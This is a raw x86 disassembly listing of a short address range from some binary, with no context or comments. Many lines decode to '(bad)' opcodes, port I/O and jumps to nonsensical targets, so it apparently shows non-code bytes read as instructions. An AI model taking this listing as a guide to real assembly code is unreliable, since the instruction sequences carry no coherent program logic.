  4190e9:	sub    al,0x18
  4190eb:	add    DWORD PTR [eax],0xfd81c3ad
  4190f1:	cdq    
  4190f2:	mov    ebx,0xcc45fd81
  4190f7:	cmp    ebp,0xfd81cc53
  4190fd:	push   ebx
  4190fe:	mov    esp,0xbc67fd81
  419103:	cmp    ebp,0xfd818c5d
  419109:	mov    DWORD PTR [ecx+eax*4-0x7e837a03],ecx
  419110:	std    
  419111:	stos   DWORD PTR es:[edi],eax
  419112:	jl     0x419095
  419114:	std    
  419115:	(bad)  
  419116:	mov    WORD PTR [ecx-0x7e737203],es
  41911c:	std    
  41911d:	jmp    0x4190a7
  41911f:	cmp    ebp,0xfd8180fb
  419125:	int    0x0
	...
  41913b:	enter  0xfd7f,0xb5
  41913f:	sar    BYTE PTR [edi-0x3],0x2f
  419143:	mov    edi,0xbf17fd7f
  419148:	jg     0x419147
  41914a:	ror    eax,cl
  41914c:	jg     0x41914b
  41914e:	loope  0x419110
  419150:	jg     0x41914f
  419152:	gs mov edi,0xbf8bfd7f
  419158:	jg     0x419157
  41915a:	jge    0x4190eb
  41915c:	jg     0x41915b
  41915e:	sub    DWORD PTR [edi+0x7f19fd7f],ecx
  419164:	jg     0x419163
  419166:	or     eax,0x19fd7f7f
  41916b:	(bad)  
  41916c:	jg     0x41916b
  41916e:	jmp    0xfc3f1102
  419173:	jg     0x4191f4
  419175:	std    
  419176:	retf   
  419177:	jg     0x4191f8
  419179:	std    
  41917a:	add    ah,ah
  41917c:	sub    bh,ch
  41917e:	push   DWORD PTR [eax]
  419180:	sub    edi,ebp
  419182:	jmp    FWORD PTR [eax]
  419184:	sub    edi,ebp
  419186:	call   DWORD PTR [edx+ebp*1+0x2b2afffd]
  41918d:	std    
  41918e:	call   DWORD PTR [edx]
  419190:	sub    edi,ebp
  419192:	dec    DWORD PTR [edx+0x2b]
  419195:	std    
  419196:	push   DWORD PTR [esi]
  419198:	sub    edi,ebp
  41919a:	(bad)  
  41919b:	clc    
  41919c:	sub    bh,ch
  41919e:	inc    DWORD PTR [eax]
	...
  4191b4:	sbb    BYTE PTR [ebx],ch
  4191b6:	std    
  4191b7:	inc    eax
  4191b9:	and    eax,0x25dafffd
  4191be:	std    
  4191bf:	(bad)  
  4191c0:	fisub  DWORD PTR ds:0x2876fffd
  4191c6:	std    
  4191c7:	push   DWORD PTR [eax+ebp*1-0x3]
  4191cb:	jmp    DWORD PTR [esi-0x590002d8]
  4191d1:	sub    ch,bh
  4191d3:	call   DWORD PTR [esi]
  4191d5:	es std 
  4191d7:	push   eax
  4191d9:	and    eax,0x37efffd
  4191de:	add    BYTE PTR [eax],al
  4191e0:	int3   
  4191e1:	and    eax,0x25e4fffd
  4191e6:	std    
  4191e7:	dec    esp
  4191e9:	and    eax,0x287cfffd
  4191ee:	std    
  4191ef:	(bad)  
  4191f0:	jl     0x41921a
  4191f2:	std    
  4191f3:	jmp    DWORD PTR [eax+0x3efffd27]
  4191f9:	add    eax,DWORD PTR [eax]
  4191fb:	add    dh,bh
  4191fd:	daa    
  4191fe:	std    
  4191ff:	dec    DWORD PTR [esi+0x3]
  419202:	add    BYTE PTR [eax],al
  419204:	data16 sub ch,bh
  419207:	jmp    DWORD PTR [edi+0x28ff2681]
  41920d:	lea    esp,[esi]
  41920f:	jmp    DWORD PTR [eax]
  419211:	repz and eax,0x25e118ff
  419217:	inc    DWORD PTR [eax]
	...
  41922d:	adc    cl,al
  41922f:	and    eax,0x263108ff
  419234:	inc    DWORD PTR [eax]
  419236:	mov    bl,0x23
  419238:	(bad)  
  419239:	clc    
  41923a:	inc    edx
  41923b:	and    edi,edi
  41923d:	lock pop eax
  41923f:	and    edi,edi
  419241:	call   0xa74193ae
  419246:	ja     0x419269
  419248:	(bad)  
  419249:	fsubr  DWORD PTR [eax+0x1]
  41924c:	add    BYTE PTR [edi-0x3700dbfd],ah
  419252:	outs   dx,BYTE PTR ds:[esi]
  419253:	and    edi,edi
  419255:	shr    BYTE PTR [eax+0x1],0x0
  419259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41925a:	or     DWORD PTR [edi+edi*8],esp
  41925d:	mov    al,0x4
  41925f:	and    al,0xff
  419261:	test   al,0x10
  419263:	and    al,0xff
  419265:	mov    al,ds:0x98ff23f0
  41926a:	out    dx,al
  41926b:	and    edi,edi
  41926d:	nop
  41926e:	shl    BYTE PTR [ebx],cl
  419270:	dec    DWORD PTR [eax-0x58fffe94]
  419276:	cdq    
  419277:	and    al,0xff
  419279:	js     0x419219
  41927b:	and    al,0xff
  41927d:	jo     0x4192a5
  41927f:	and    al,0xff
  419281:	push   0x60ff2434
  419286:	retf   0xff23
  419289:	pop    eax
  41928a:	cmp    al,0x24
  41928c:	call   DWORD PTR [eax+0x34]
  41928f:	and    al,0xff
	...
  4192a5:	add    BYTE PTR [eax+0x6a],cl
  4192a8:	and    bh,bh
  4192aa:	inc    eax
  4192ab:	add    esi,ecx
  4192ad:	and    bh,BYTE PTR [eax]
  4192af:	jle    0x4192b0
  4192b1:	and    dh,BYTE PTR [eax]
  4192b3:	jle    0x41929c
  4192b5:	add    esp,DWORD PTR [edi+0x2022d902]
  4192bb:	jle    0x41926a
  4192bd:	and    bl,BYTE PTR [eax]
  4192bf:	jle    0x4192a8
  4192c1:	add    esp,DWORD PTR [edi+0x828d302]
  4192c7:	jle    0x41928a
  4192c9:	sub    BYTE PTR [eax],al
  4192cb:	jle    0x4192ea
  4192cd:	sub    eax,edi
  4192cf:	jge    0x4192f4
  4192d1:	sub    eax,esi
  4192d3:	jge    0x41930c
  4192d5:	sub    eax,ebp
  4192d7:	jge    0x419304
  4192d9:	sub    eax,esp
  4192db:	jge    0x41932e
  4192dd:	sub    eax,ebx
  4192df:	jge    0x419322
  4192e1:	sub    eax,edx
  4192e3:	jge    0x419352
  4192e5:	sub    al,cl
  4192e7:	jge    0x41933c
  4192e9:	sub    al,al
  4192eb:	jge    0x419334
  4192ed:	sub    BYTE PTR [eax-0x4fd7b483],bh
  4192f3:	jge    0x41929e
  4192f5:	sub    BYTE PTR [eax-0x5fd75283],ch
  4192fb:	jge    0x419290
  4192fd:	sub    BYTE PTR [eax-0x6fd81683],bl
  419303:	jge    0x4192de
  419305:	daa    
  419306:	mov    BYTE PTR [ebp-0x3d],bh
  419309:	daa    
	...
  41931e:	add    BYTE PTR [eax+0x78281b7d],al
  419324:	jge    0x4192cb
  419326:	daa    
  419327:	jo     0x4193a6
  419329:	mov    ebp,0xc17d6827
  41932e:	daa    
  41932f:	pusha  
  419330:	jge    0x4192f1
  419332:	daa    
  419333:	pop    eax
  419334:	jge    0x4193a1
  419336:	daa    
  419337:	push   eax
  419338:	jge    0x41933a
  41933a:	mov    eax,DWORD PTR [eax-0x778a0283]
  419340:	jge    0x41933f
  419342:	sub    DWORD PTR [eax-0x77c60283],eax
  419348:	jge    0x419347
  41934a:	xor    eax,0x19fd7d80
  41934f:	enter  0xfd7d,0xe9
  419353:	sar    DWORD PTR [ebp-0x3],0xdb
  419357:	leave  
  419358:	jge    0x419357
  41935a:	retf   
  41935b:	sar    DWORD PTR [ebp-0x3],0xb3
  41935f:	leave  
  419360:	jge    0x41935f
  419362:	aas    
  419363:	push   es
  419364:	jl     0x419363
  419366:	dec    edi
  419367:	push   es
  419368:	jl     0x419367
  41936a:	push   ebx
  41936b:	push   es
  41936c:	jl     0x41936b
  41936e:	ins    DWORD PTR es:[edi],dx
  41936f:	(bad)  
  419370:	jnp    0x41936f
  419372:	jge    0x41933a
  419374:	jnp    0x419373
  419376:	lods   eax,DWORD PTR ds:[esi]
  419377:	(bad)  
  419378:	jnp    0x419377
  41937a:	xchg   ecx,eax
  41937b:	(bad)  
  41937c:	jnp    0x41937b
  41937e:	mov    edi,0xa7fd7bc6
	...
  419397:	add    dh,al
  419399:	jnp    0x419398
  41939b:	out    0xc6,eax
  41939d:	jnp    0x41939c
  41939f:	cmc    
  4193a0:	(bad)  
  4193a1:	jnp    0x4193a0
  4193a3:	mov    ebp,0x31fd7d86
  4193a8:	test   DWORD PTR [ebp-0x3],edi
  4193ab:	and    eax,DWORD PTR [ebp-0x7afe0283]
  4193b1:	jge    0x4193b0
  4193b3:	icebp  
  4193b4:	xchg   BYTE PTR [ebp-0x3],bh
  4193b7:	jno    0x41933e
  4193b9:	jge    0x4193b8
  4193bb:	ja     0x419342
  4193bd:	jge    0x4193bc
  4193bf:	jmp    0x2b419668
  4193c4:	inc    ebp
  4193c5:	jge    0x4193c4
  4193c7:	add    BYTE PTR [eax+eiz*2+0x608cfffe],al
  4193ce:	(bad)  
  4193cf:	(bad)  
  4193d0:	cmp    al,0x61
  4193d2:	(bad)  
  4193d3:	call   FWORD PTR [ecx+eiz*2-0x2]
  4193d7:	jmp    FWORD PTR [eax+0x61]
  4193da:	(bad)  
  4193db:	(bad)  
  4193dc:	add    BYTE PTR ds:[eax],al
  4193df:	add    dh,bh
  4193e1:	pusha  
  4193e2:	(bad)  
  4193e3:	dec    DWORD PTR [esi]
  4193e5:	add    BYTE PTR [eax],al
  4193e7:	add    BYTE PTR [esi+0x61],al
  4193ea:	(bad)  
  4193eb:	push   DWORD PTR [esi]
  4193ed:	popa   
  4193ee:	(bad)  
  4193ef:	call   DWORD PTR [edx-0x7b0001a0]
  4193f5:	pop    edi
  4193f6:	(bad)  
  4193f7:	jmp    DWORD PTR [esi]
  4193f9:	popa   
  4193fa:	(bad)  
  4193fb:	inc    DWORD PTR [eax]
	...
  419411:	push   ss
  419412:	popa   
  419413:	(bad)  
  419414:	call   DWORD PTR [esi]
  419416:	popa   
  419417:	(bad)  
  419418:	inc    DWORD PTR [ecx+eiz*2]
  41941b:	(bad)  
  41941c:	inc    DWORD PTR [ecx+eiz*2]
  41941f:	(bad)  
  419420:	dec    DWORD PTR [esi]
  419422:	popa   
  419423:	(bad)  
  419424:	(bad)  
  419425:	mov    esi,0xe0ffffff
  41942a:	pop    edi
  41942b:	(bad)  
  41942c:	dec    esi
  41942e:	(bad)  
  41942f:	(bad)  
  419430:	call   esp
  419432:	pop    edi
  419433:	(bad)  
  419434:	call   eax
  419436:	pop    edi
  419437:	(bad)  
  419438:	dec    DWORD PTR [esi-0x51000001]
  41943e:	data16 (bad) 
  419440:	jmp    DWORD PTR [edx-0x6900019a]
  419446:	pop    edi
  419447:	(bad)  
  419448:	dec    DWORD PTR [edx]
  41944a:	pusha  
  41944b:	(bad)  
  41944c:	push   eax
  41944e:	pop    edi
  41944f:	(bad)  
  419450:	jmp    DWORD PTR [edi+ebx*2]
  419453:	(bad)  
  419454:	jmp    DWORD PTR [edi-0x58fffe97]
  41945a:	xchg   edi,eax
  41945b:	loope  0x41945b
  41945d:	pop    eax
  41945e:	and    ecx,0xfffffffe
  419461:	push   eax
  419462:	sub    esp,ecx
  419464:	dec    BYTE PTR [eax+0x11]
  419467:	loope  0x419467
  419469:	inc    eax
  41946a:	(bad)  
  41946b:	loopne 0x41946b
  41946d:	cmp    BYTE PTR [ecx],bl
  41946f:	loope  0x41946f
  419471:	xor    BYTE PTR [ecx],ah
  419473:	loope  0x419473
	...
  419489:	add    BYTE PTR [eax],ch
  41948b:	addr16 in al,0xfe
  41948e:	and    BYTE PTR [edi-0x1c],bl
  419491:	(bad)  
  419492:	sbb    BYTE PTR [ecx-0x1c],ah
  419495:	(bad)  
  419496:	adc    BYTE PTR [ecx+0x1],ch
  419499:	add    BYTE PTR [edi+0xfee4b7],ah
  41949f:	mov    ds:0x68f8fee4,eax
  4194a4:	add    DWORD PTR [eax],eax
  4194a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194a7:	push   ds
  4194a8:	add    al,0x41
  4194aa:	jne    0x41947a
  4194ac:	loopne 0x419521
  4194ae:	dec    edx
  4194af:	and    ebp,ecx
  4194b1:	imul   eax,DWORD PTR [edx+0x2a],0x4
  4194b5:	aas    
  4194b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194b7:	pop    ss
  4194b8:	in     eax,0x5e
  4194ba:	inc    ebx
  4194bb:	sub    ebp,ecx
  4194bd:	imul   ecx,DWORD PTR [edx+0x69],0x1
  4194c1:	and    DWORD PTR [edi+0x346cf028],esp
  4194c7:	push   es
  4194c8:	int3   
  4194c9:	pop    esi
  4194ca:	cmp    DWORD PTR ds:0x94a762f0,ecx
  4194d0:	push   es
  4194d1:	push   ebp
  4194d2:	adc    eax,0xe962f813
  4194d7:	adc    dh,al
  4194d9:	bound  esp,QWORD PTR [edi-0xb93fbb2]
  4194df:	outs   dx,DWORD PTR ds:[esi]
  4194e0:	repz imul eax,DWORD PTR [edx],0x3
  4194e4:	aad    0xc2
  4194e6:	jo     0x419562
  4194e8:	xchg   edi,eax
  4194e9:	add    esp,edx
  4194eb:	out    0xc5,al
  4194ed:	in     eax,0x0
	...
  419503:	add    edi,esp
  419505:	call   0x1a03:0xe6edc7f0
  41950c:	add    al,0xa6
  41950e:	out    dx,eax
  41950f:	mov    ebx,0xd5efc7e4
  419514:	call   0xee0985d3
  419519:	out    0x3,al
  41951b:	cmp    eax,DWORD PTR [ebx+ebp*4]
  41951e:	lock (bad) 
  419520:	jecxz  0x4194a4
  419522:	leave  
  419523:	xchg   esi,eax
  419524:	fild   WORD PTR [ebx-0x4cfbe8fd]
  41952a:	lock xchg ebx,esp
  41952d:	mov    al,dl
  41952f:	jl     0x419517
  419531:	test   esp,esp
  419533:	add    BYTE PTR [edx-0x30],bh
  419536:	add    al,0x8b
  419538:	cmc    
  419539:	pop    edx
  41953a:	test   BYTE PTR [edi-0x173ca00e],0x79
  419541:	cli    
  419542:	add    al,0x53
  419544:	cmc    
  419545:	push   edx
  419546:	test   BYTE PTR [edi-0x1d],0x3a
  41954a:	ret    
  41954b:	sar    BYTE PTR [ecx-0x2a],1
  41954e:	add    ah,BYTE PTR [edx-0x21]
  419551:	cmp    cl,dl
  419553:	dec    ecx
  419554:	out    0x43,al
  419556:	ret    
  419557:	xor    al,0xee
  419559:	sbb    bl,ch
  41955b:	inc    esi
  41955c:	out    dx,eax
  41955d:	adc    ah,bh
  41955f:	aaa    
  419560:	ret    
  419561:	out    0x3,al
  419563:	cmp    al,0x2
  419565:	and    al,0xfc
	...
  41957b:	add    BYTE PTR [eax],cl
  41957d:	in     al,0x14
  41957f:	call   0xeb367e69
  419584:	push   ss
  419585:	jmp    0xf56d:0xe49006ff
  41958c:	push   ebx
  41958d:	cmc    
  41958e:	jno    0x419560
  419590:	jbe    0x419570
  419592:	jo     0x41953c
  419594:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419595:	push   ss
  419596:	jmp    FWORD PTR [ebp-0x3fba0ab7]
  41959c:	dec    eax
  41959d:	in     al,0x50
  41959f:	rcl    BYTE PTR [edx-0x1c],1
  4195a2:	(bad)  
  4195a3:	(bad)  
  4195a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195a5:	ret    
  4195a6:	jno    0x419574
  4195a8:	inc    ebp
  4195a9:	cmc    
  4195aa:	bound  esp,QWORD PTR [edi-0x4b9d12b3]
  4195b0:	inc    ebp
  4195b1:	jmp    0xde782625
  4195b6:	ds jmp 0x9c439860
  4195bc:	add    eax,0x99055e9
  4195c1:	out    dx,al
  4195c2:	dec    esp
  4195c3:	xchg   esi,ebx
  4195c5:	fild   QWORD PTR [ebx-0x74]
  4195c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195c9:	push   ebx
  4195ca:	add    dl,BYTE PTR [esi+esi*8-0x26a6a115]
  4195d1:	fbld   TBYTE PTR [edx+0x56]
  4195d4:	fcomp  st(6)
  4195d6:	inc    ebp
  4195d7:	inc    eax
  4195d8:	xlat   BYTE PTR ds:[ebx]
  4195d9:	jecxz  0x4195da
  4195db:	ret    0xc6a2
  4195de:	ins    BYTE PTR es:[edi],dx
  4195df:	dec    eax
	...
  4195f4:	add    BYTE PTR [edi-0x2ab49934],bh
  4195fa:	xlat   BYTE PTR ds:[ebx]
  4195fb:	jno    0x41962d
  4195fd:	jmp    0x62bf:0xa21afd78
  419604:	sbb    eax,0xa6cf2db
  419609:	loop   0x4195ef
  41960b:	arpl   WORD PTR [ebx],bx
  41960d:	mov    ?,ebx
  41960f:	jo     0x4195fa
  419611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419612:	jle    0x419613
  419614:	inc    ecx
  419616:	imul   esi,DWORD PTR [ecx+0x54],0x506d71a3
  41961d:	scas   eax,DWORD PTR es:[edi]
  41961e:	jp     0x419685
  419620:	inc    ecx
  419621:	mov    es,WORD PTR [ecx+esi*1]
  419624:	add    BYTE PTR ds:0x52616272,bh
  41962a:	imul   eax,DWORD PTR [ecx+0x69],0x7c
  41962e:	imul   esp,DWORD PTR [eax+0x74],0x19
  419632:	jb     0x4196aa
  419634:	inc    ecx
  419635:	ds add al,0x65
  419638:	add    BYTE PTR [edx],al
  41963a:	imul   ebp,DWORD PTR [ecx+0x65],0x2
  41963e:	imul   eax,DWORD PTR [ebx+0x69],0xfffffffa
  419642:	push   0x3e
  419644:	add    BYTE PTR [esi],bh
  419646:	inc    DWORD PTR [edx+0x65]
  419649:	adc    al,BYTE PTR [ebp+0x72]
  41964c:	jb     0x41968a
  41964e:	imul   ebp,DWORD PTR [ebx+0x74],0x5e
  419652:	jb     0x4196c0
  419654:	arpl   WORD PTR [ebx],sp
  419656:	jne    0x4196c8
	...
  41966c:	add    BYTE PTR [eax],al
  41966e:	push   cs
  41966f:	add    dl,BYTE PTR [ebx+0x69]
  419672:	xor    ch,BYTE PTR [ebx+0x40]
  419675:	push   0x6f51722f
  41967a:	mov    ebx,0x57746979
  41967f:	inc    esp
  419680:	jbe    0x4196f6
  419682:	jae    0x419682
  419684:	lods   al,BYTE PTR ds:[esi]
  419685:	add    BYTE PTR [eax-0x7f9b949b],al
  41968b:	outs   dx,DWORD PTR gs:[esi]
  41968d:	jae    0x419621
  41968f:	inc    eax
  419690:	data16 ins BYTE PTR es:[edi],dx
  419692:	jae    0x4196d1
  419694:	std    
  419695:	call   ecx
  419697:	add    al,0x6c
  419699:	jae    0x41962d
  41969b:	je     0x4196fd
  41969d:	ins    DWORD PTR es:[edi],dx
  41969e:	mov    fs,WORD PTR [ebp+0x3e]
  4196a1:	add    BYTE PTR [edi+0xe4600d3],ah
  4196a7:	js     0x41968e
  4196a9:	dec    ebp
  4196aa:	or     al,BYTE PTR [edx]
  4196ac:	clc    
  4196ad:	inc    ebp
  4196ae:	inc    BYTE PTR ds:0xbea73ee7
  4196b4:	add    BYTE PTR [esi+0xe],al
  4196b7:	js     0x41969e
  4196b9:	inc    eax
  4196ba:	add    edx,DWORD PTR [ecx-0xe]
  4196bd:	bound  esp,QWORD PTR [edi-0x35bafcf3]
  4196c3:	push   ebp
  4196c4:	shr    BYTE PTR [ebx+eax*8+0x4e],1
  4196c8:	in     eax,dx
  4196c9:	(bad)  
  4196ca:	fisttp WORD PTR [edx-0x15]
  4196cd:	arpl   WORD PTR [ebx+0xffc43e],di
	...
  4196e7:	inc    eax
  4196e8:	xlat   BYTE PTR ds:[ebx]
  4196e9:	add    eax,DWORD PTR [ebp-0x3e]
  4196ec:	lods   eax,DWORD PTR ds:[esi]
  4196ed:	shl    DWORD PTR [edx-0x4b],cl
  4196f0:	pushf  
  4196f1:	in     al,dx
  4196f2:	ins    BYTE PTR es:[edi],dx
  4196f3:	mov    ecx,0xa73ef99e
  4196f8:	inc    ebx
  4196f9:	add    al,0x45
  4196fb:	or     BYTE PTR [ebp-0x757b9333],0xed
  419702:	bound  ebx,QWORD PTR [esi-0x79]
  419705:	jecxz  0x419773
  419707:	imul   ax,WORD PTR [ecx],0xa674
  41970c:	mov    al,ds:0xe25473e8
  419711:	out    dx,al
  419712:	jae    0x419696
  419714:	(bad)  
  419715:	enter  0x496d,0xc0
  419719:	add    esp,DWORD PTR [eax+0x73e520a6]
  41971f:	js     0x4196f3
  419721:	in     eax,dx
  419722:	arpl   WORD PTR [eax],di
  419724:	xor    bh,ch
  419726:	inc    ebx
  419727:	dec    esi
  419728:	cmp    esp,ebp
  41972a:	pusha  
  41972b:	xor    edi,DWORD PTR [eax]
  41972d:	bnd jbe 0x419796
  419730:	add    ah,bh
  419732:	add    ebx,DWORD PTR [edx+0x1]
  419735:	es out 0x14,eax
  419738:	rcr    DWORD PTR [eax],cl
  41973a:	jmp    0x41974e
  41973c:	in     al,0x12
  41973e:	out    0xe0,eax
  419740:	lock adc eax,0x3e701e6
  419746:	shl    esp,1
  419748:	lock (bad) 
  41974a:	in     eax,dx
	...
  41975f:	add    BYTE PTR [ebx],al
  419761:	(bad)  
  419762:	out    0x3,al
  419764:	in     eax,dx
  419765:	add    BYTE PTR [edx-0x2c3e0b1a],bh
  41976b:	icebp  
  41976c:	(bad)  
  41976d:	ffreep st(4)
  41976f:	mul    esp
  419771:	jmp    0x41974b
  419773:	out    0xc7,al
  419775:	out    dx,al
  419776:	aad    0xf1
  419778:	rol    ebx,1
  41977a:	out    0x3,al
  41977c:	xchg   esp,eax
  41977d:	add    ebx,eax
  41977f:	lock mov ah,0xf0
  419782:	leave  
  419783:	out    dx,al
  419784:	rol    bl,0xe6
  419787:	add    ebx,ebx
  419789:	add    esp,DWORD PTR [esi-0x672d6b1a]
  41978f:	jmp    0xf060:0xe692e392
  419796:	xchg   ebp,eax
  419797:	in     eax,0x81
  419799:	out    0x83,al
  41979b:	rol    BYTE PTR [ebp-0x7415851f],1
  4197a1:	in     al,0x9c
  4197a3:	loop   0x419822
  4197a5:	fistp  WORD PTR [ecx-0x3d]
  4197a8:	call   0x6a44c822
  4197ad:	fistp  WORD PTR [edx-0x2c]
  4197b0:	push   esi
  4197b1:	jmp    0x419807
  4197b3:	jecxz  0x419809
  4197b5:	fist   WORD PTR [esi]
  4197b7:	repnz cmp ebx,esp
  4197ba:	dec    edi
  4197bb:	lock inc ebp
  4197bd:	retf   
  4197be:	inc    DWORD PTR [esi-0x41]
  4197c1:	xor    al,0x0
  4197c3:	scas   eax,DWORD PTR es:[edi]
	...
  4197d8:	add    BYTE PTR [edi+edi*4-0xf19e29e],ah
  4197df:	jno    0x4197fc
  4197e1:	mov    bh,ah
  4197e3:	jae    0x419812
  4197e5:	mov    ebx,?
  4197e7:	bound  ecx,QWORD PTR [edx]
  4197e9:	(bad)  
  4197ea:	out    0x71,al
  4197ec:	add    BYTE PTR [ebp+esi*2-0x3],ah
  4197f0:	fbld   TBYTE PTR [edi+0x76fd70e6]
  4197f6:	jmp    0x759d975d
  4197fb:	std    
  4197fc:	hlt    
  4197fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197fe:	leave  
  4197ff:	jb     0x4197ce
  419801:	pop    eax
  419802:	fadd   QWORD PTR [ecx-0x30]
  419805:	push   eax
  419806:	loopne 0x41985b
  419808:	mov    esi,0xcc63dc7b
  41980d:	fstp   QWORD PTR [bp-0x45]
  419811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419812:	mov    edi,edi
  419814:	lods   eax,DWORD PTR ds:[esi]
  419815:	inc    ecx
  419816:	icebp  
  419817:	push   ebx
  419818:	rol    BYTE PTR [edi-0x16],0x40
  41981c:	xchg   esi,eax
  41981d:	xor    edi,esp
  41981f:	jae    0x41980a
  419821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419822:	mov    ebx,0xe008ba02
  419827:	bound  ebx,QWORD PTR [ecx-0x5200cf5c]
  41982d:	add    ecx,esi
  41982f:	dec    edx
  419830:	mov    cs,WORD PTR [eax]
  419832:	lock imul ecx,DWORD PTR [edx+eiz*8-0x1d7b9425],0xffffffd3
  41983b:	push   0x4c
	...
  419851:	add    dl,ah
  419853:	je     0x419852
  419855:	adc    DWORD PTR [edx-0x10a29d41],ebp
  41985b:	shl    DWORD PTR [eax+0x55],cl
  41985e:	out    0xf2,al
  419860:	jno    0x419862
  419862:	jno    0x4198d0
  419864:	std    
  419865:	inc    DWORD PTR [edi+0x6b723efe]
  41986b:	pop    edi
  41986c:	jno    0x4198d3
  41986e:	call   0x6963:0x966c6c69
  419875:	jo     0x4198f4
  419877:	cs dec edi
  419879:	outs   dx,BYTE PTR ds:[esi]
  41987a:	scas   eax,DWORD PTR es:[edi]
  41987b:	outs   dx,BYTE PTR ds:[esi]
  41987c:	jo     0x4198e6
  41987e:	xchg   ecx,eax
  41987f:	fs std 
  419881:	call   FWORD PTR [ebx-0x2]
  419884:	dec    edi
  419885:	jb     0x419838
  419887:	pop    ebx
  419888:	bound  esi,QWORD PTR [ebx+0x7d]
  41988b:	sub    eax,0x6ca74632
  419890:	jo     0x419906
  419892:	jle    0x419894
  419894:	sbb    BYTE PTR [edx],al
  419896:	adc    DWORD PTR [eax+0x62],esi
  419899:	outs   dx,BYTE PTR ds:[esi]
  41989a:	push   ds
  41989b:	outs   dx,BYTE PTR ds:[esi]
  41989c:	ins    BYTE PTR es:[edi],dx
  41989d:	arpl   WORD PTR [ebx+0x6d],bp
  4198a0:	jo     0x4198a2
  4198a2:	cdq    
  4198a3:	cld    
  4198a4:	dec    edi
  4198a5:	jb     0x419918
  4198a7:	pop    ebp
  4198a8:	bound  esi,QWORD PTR [ebx-0x3]
  4198ab:	sub    al,0x32
  4198ad:	dec    esi
  4198ae:	imul   edi,DWORD PTR [eax+0x71],0x0
  4198b2:	cdq    
  4198b3:	std    
  4198b4:	dec    ebx
  4198b5:	inc    ebx
	...
  4198ca:	add    BYTE PTR [ebx+0x5f],dl
  4198cd:	ins    DWORD PTR es:[edi],dx
  4198ce:	push   ebx
  4198cf:	cmp    ch,BYTE PTR [esi+0x66]
  4198d2:	outs   dx,BYTE PTR ds:[esi]
  4198d3:	sub    DWORD PTR [edi],edi
  4198d5:	std    
  4198d6:	inc    DWORD PTR [ebp+0x177840fe]
  4198dc:	fs dec ebp
  4198de:	jb     0x419901
  4198e0:	pop    ebp
  4198e1:	bound  esi,QWORD PTR [ebx+0x6d]
  4198e4:	jmp    FWORD PTR [edx+eax*1+0x557161ad]
  4198eb:	jo     0x419953
  4198ed:	pop    esi
  4198ee:	outs   dx,BYTE PTR ds:[esi]
  4198ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198f0:	(bad)
  4198f3:	dec    ebx
  4198f4:	push   ds
  4198f5:	cld    
  4198f6:	pusha  
  4198f7:	inc    edx
  4198f8:	cmp    eax,esi
  4198fa:	push   ax
  4198fc:	ret    
  4198fd:	shl    DWORD PTR [esi+0x4b],0x35
  419901:	fbstp  TBYTE PTR [ecx-0x59]
  419904:	rcr    dh,0x71
  419907:	cmp    DWORD PTR [esi],eax
  419909:	call   0xdd856e3e
  41990e:	imul   ecx,DWORD PTR [ebx],0x6a
  419911:	add    DWORD PTR [ecx+0x62f628a7],ecx
  419917:	push   es
  419918:	jbe    0x4198fa
  41991a:	push   eax
  41991b:	sti    
  41991c:	ja     0x4198fe
  41991e:	pop    esi
  41991f:	or     bl,BYTE PTR ds:0x75e847ea
  419925:	jmp    0xa795:0x14e0661
  41992c:	pushf  
  41992d:	loopne 0x4199a2
	...
  419943:	add    bh,ch
  419945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419946:	in     eax,0x6c
  419948:	lds    ecx,FWORD PTR [edx-0x1b]
  41994b:	inc    ebp
  41994c:	aad    0x4c
  41994e:	call   0xe0f954a3
  419953:	pop    esi
  419954:	retf   0x169
  419957:	push   cs
  419958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419959:	test   al,0xea
  41995b:	inc    eax
  41995c:	mov    ch,0x86
  41995e:	in     al,0x73
  419960:	mov    bl,BYTE PTR [eax+esi*8+0x1698366]
  419967:	pusha  
  419968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419969:	test   al,0xea
  41996b:	push   ebx
  41996c:	xchg   al,bh
  41996e:	in     eax,dx
  41996f:	dec    edx
  419970:	mov    al,BYTE PTR [esi-0x797d8e41]
  419976:	add    DWORD PTR ds:0x40eaa8a7,ecx
  41997c:	jne    0x419980
  41997e:	dec    esp
  41997f:	jecxz  0x4199d5
  419981:	(bad)  [edi]
  419983:	jmp    0xdd47:0xea47ee57
  41998a:	out    0x3,al
  41998c:	(bad)  
  41998d:	add    DWORD PTR [esi],esi
  41998f:	call   0xeb8e62d9
  419994:	xor    al,0xe9
  419996:	inc    edi
  419997:	call   0x48591e5
  41999c:	cmp    ah,dh
  41999e:	or     esi,DWORD PTR ds:0xe80320d5
  4199a4:	or     al,0x3
  4199a6:	adc    al,0x6
	...
  4199bc:	add    BYTE PTR [edx],bl
  4199be:	not    BYTE PTR [esi]
  4199c0:	test   BYTE PTR [ecx],0xe1
  4199c3:	cli    
  4199c4:	loope  0x419987
  4199c6:	add    dh,ah
  4199c8:	hlt    
  4199c9:	add    eax,0xc135b9f5
  4199ce:	out    0xfa,al
  4199d0:	out    0x68,eax
  4199d2:	jb     0x419a0b
  4199d4:	add    esi,ebp
  4199d6:	out    0xc5,eax
  4199d8:	enter  0xe7c8,0xc4
  4199dc:	int3   
  4199dd:	(bad)
  4199e0:	sti    
  4199e1:	mov    DWORD PTR [edx],eax
  4199e3:	and    DWORD PTR [ebx],eax
  4199e5:	aad    0xe7
  4199e7:	(bad)
  4199ea:	out    0xb8,eax
  4199ec:	cli    
  4199ed:	(bad)  
  4199ef:	mov    edx,0x9ec7c5ee
  4199f4:	ret    0x7220
  4199f7:	push   esi
  4199f8:	add    esi,DWORD PTR [ebp-0x19]
  4199fb:	(bad)  
  4199fc:	les    edi,FWORD PTR [ecx+eiz*8-0x67]
  419a00:	ficomp WORD PTR [edi-0x19]
  419a03:	jg     0x419a08
